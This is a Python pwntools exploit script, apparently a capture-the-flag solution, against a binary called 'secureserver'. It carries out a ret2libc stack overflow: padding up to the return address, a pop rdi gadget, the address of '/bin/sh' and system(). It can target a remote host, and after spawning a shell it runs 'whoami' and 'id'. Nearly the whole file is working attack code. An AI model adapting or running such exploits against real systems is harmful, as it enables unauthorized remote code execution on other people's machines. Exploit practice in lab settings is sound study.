from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

context.terminal = ["tmux", "splitw", "-l", "80%", "-t", ":.1"]
context.log_level = 'debug'

# Specify GDB script here (breakpoints etc)
gdbscript = '''
# init-pwndbg
# b  *0x0000000000401179
# b  *receive_feedback+39
continue
'''.format(**locals())


# Binary filename
exe = './secureserver'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Lib-C library
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
# libc.address = 0x00007ffff7d75000
# libc = ELF('libc-2.3.1.so')  # Remote

# Lib-c offsets, found manually (ASLR_OFF)
libc_base = 0x00007ffff7d75000

# readelf -s /lib/x86_64-linux-gnu/libc.so.6  | grep system
# 1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
# OR
# pwndbg> x system
# 0xf7db3150 <__libc_system>:     0xfb1e0ff3
system = libc_base + 0x50d60

# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "bin/sh"
# OR
# pwndbg> search '/bin/sh'
# libc.so.6       0xf7f280f5 '/bin/sh'
binsh = libc_base + 0x1d8698

# POP RDI gadget (found with ropper)
# ropper --file secureserver --search 'pop rdi'
pop_rdi = 0x40120b

info("--------------------------------")
info("system   %#x", system)
info("binsh    %#x", binsh)
info("pop_rdi  %#x", pop_rdi)
info("--------------------------------")


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
libc.address = 0x00007ffff7d75000

if False:
    info("system   %#x", libc.symbols['system'])
    info("binsh    %#x", next(libc.search(b'/bin/sh\x00')))
    rop = ROP(libc)
    rop.system(next(libc.search(b'/bin/sh\x00')))
    print(rop.dump())

    payload=flat({
        72: rop.chain(),
    })

    io.sendlineafter(b':', payload)
    io.interactive()
    exit()

# How many bytes to the instruction pointer (RIP)?
padding = 72

payload = flat(
    asm('nop') * padding,  # Padding up to RIP
    # libc.address+ 0xebcf1
    # libc.address+ 0xebcf1,
    # libc.address+ 0xebcf5,
    # libc.address+ 0xebcf8,
    pop_rdi,  # Pop the following address into the RDI register
    binsh,  # Address of /bin/sh in libc
    0x401016,   # stack align  https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call
                # gefâž¤  x/i 0x401016
                #    0x401016 <_init+22>: ret
    system,  # Address of system function in libc
)

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter(b':', payload)

io.write(b"\n")
io.write(b"whoami\n")
io.write(b"id\n")
# Get flag/shell
io.interactive()

